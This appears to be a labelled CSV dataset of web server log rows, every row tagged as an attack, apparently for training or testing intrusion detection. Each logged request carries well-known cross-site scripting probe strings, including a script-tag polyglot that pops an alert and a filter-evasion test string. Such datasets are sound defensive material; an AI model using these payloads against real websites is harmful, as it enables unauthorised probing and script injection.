"","ip","date","hour","minute","seconds","zone","request1","request2","status","respsize","url","computer","attaque"
"1","192.108.116.88","18/Dec/2017","13","00","31","+0000","GET "," HTTP/1.1/NA/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 183",1
"2","192.108.116.88","18/Dec/2017","13","00","31","+0000","GET ","css/index.css HTTP/1.1/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 35",1
"3","192.108.116.88","18/Dec/2017","13","00","31","+0000","GET ","img/logo.png HTTP/1.1/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 8",1
"4","192.108.116.88","18/Dec/2017","13","02","31","+0000","POST ","datalab HTTP/1.1/NA/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"5","192.108.116.88","18/Dec/2017","13","04","31","+0000","POST ","datalab HTTP/1.1/NA/datalab ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"6","192.108.116.88","18/Dec/2017","13","04","56","+0000","GET "," HTTP/1.1/NA/datalab '';!--""<XSS>=&{()} ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 19",1
"7","192.108.116.88","18/Dec/2017","13","04","56","+0000","GET ","css/index.css HTTP/1.1/datalab '';!--""<XSS>=&{()} ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 24",1
"8","192.108.116.88","18/Dec/2017","13","04","56","+0000","GET ","img/logo.png HTTP/1.1/datalab '';!--""<XSS>=&{()} ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"9","192.108.116.88","18/Dec/2017","13","04","57","+0000","POST ","datalab HTTP/1.1/NA/datalab '';!--""<XSS>=&{()} ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 206",1
"10","192.108.116.88","18/Dec/2017","13","04","57","+0000","GET ","css/index.css HTTP/1.1/datalab '';!--""<XSS>=&{()} ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 5",1
